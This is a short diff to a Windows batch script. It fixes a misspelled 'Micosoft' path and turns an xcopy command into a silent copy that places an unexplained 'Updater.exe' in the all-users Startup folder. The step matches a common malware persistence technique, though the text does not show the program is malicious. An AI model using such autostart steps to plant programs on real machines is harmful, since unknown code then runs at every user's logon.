@@ -1,1 +1,2 @@
-xcopy C:\ProgramData\Micosoft\data\Updater.exe C:\ProgramData\Microsoft\Windows\"Start Menu"\Programs\StartUp /O /X /E /H /K
+@echo off
+copy "C:\ProgramData\Microsoft\data\Updater.exe" "%allusersprofile%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
